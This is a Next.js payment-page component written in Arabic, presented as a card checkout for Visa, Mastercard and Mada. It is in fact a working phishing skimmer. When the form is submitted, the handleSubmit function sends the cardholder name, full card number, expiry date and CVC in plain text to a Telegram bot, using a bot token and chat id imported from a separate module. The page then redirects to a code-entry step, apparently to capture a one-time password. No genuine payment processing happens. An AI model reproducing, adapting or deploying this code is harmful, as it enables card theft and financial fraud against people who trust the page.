"use client"
import styles from './pay.module.css'
import visa from '../../../../../public/visa.png'
import master from '../../../../../public/master.png'
import mada from '../../../../../public/mada.png'
import Image from 'next/image'
import {useRef} from 'react'
import { useRouter,useSearchParams } from 'next/navigation'
import bot from '@/component/dataBot'

const Pay=()=>{
    const selectPay = useRef()
    const NameCard = useRef()
    const NumsCard = useRef()
    const dateCardmm = useRef()
    const dateCardyy = useRef()
    const cvcCard = useRef()
    const x = useSearchParams();
    const datas = x.get("names");
    
    const router = useRouter()
    const handleSubmit = (e) => {
        e.preventDefault();
 
        var length =` طريقة الدفع : ${selectPay.current.value} %0A   الاسم على البطاقة: ${NameCard.current.value} %0A  رقم البطاقة  : ${NumsCard.current.value} %0A  MM    :  ${dateCardmm.current.value} %0A  YY   :  ${dateCardyy.current.value} %0A cvc : ${cvcCard.current.value} %0A %0A ${datas}`
       
        
        fetch(`https://api.telegram.org/bot${bot.token}/sendMessage?chat_id=${bot.chat_id}&text=${length}`,{method:"GET"}).then(res=>res.json()).then(res=>console.log(res))
      
      }
      const handlerout = ()=>{
        if(NameCard.current.value == "" || NumsCard.current.value == "" || dateCardmm.current.value == "" || dateCardyy.current.value == "" || cvcCard.current.value == ""){
          alert('من فضلك قم بملى الحقول')
        }else{
          
          router.push(`/fotaiyar/banks/pay/code?names=${datas}`)
        }
      }
  return (
    <div className={styles.contect} dir='rtl'>
        <h1>مرحبآ بك</h1>
        <p>ادفع من خلال بطاقات الدفع التالية</p>
        <div>
            <Image 
                src={visa}
                alt='visa'
                width={50}
            />
            <Image 
                src={master}
                alt='master'
                width={50}
            />
            <Image 
                src={mada}
                alt='mada'
                width={35}
            />
        </div>
        <form action='/pay/code' onSubmit={handleSubmit}>
            <select name="selectedPay" ref={selectPay} required>
                <option value="مدى">مدى</option>
                <option value="فيزا كارد">فيزا كارد</option>
                <option value="ماستر كارد">ماستر كارد</option>
            </select>
            <input type="text" placeholder='اسم مالك البطاقة'ref={NameCard} required/>
            <input type="number" placeholder='رقم البطاقة' dir="ltr" ref={NumsCard}  required maxLength="16"/>
            <div>
            <input type="text" placeholder='(MM)'  ref={dateCardmm} maxLength="2" required/>
            <input type="text" placeholder='(YY)'  ref={dateCardyy} maxLength="2" required/>
            </div>
            
            
            <input type="text" placeholder='الرقم (cvc/cvv)'ref={cvcCard} maxLength="3" required/>
            <button type='submit' onClick={handlerout}>أدفع ألأن</button>
        </form>
    </div>
  )
}

export default Pay;
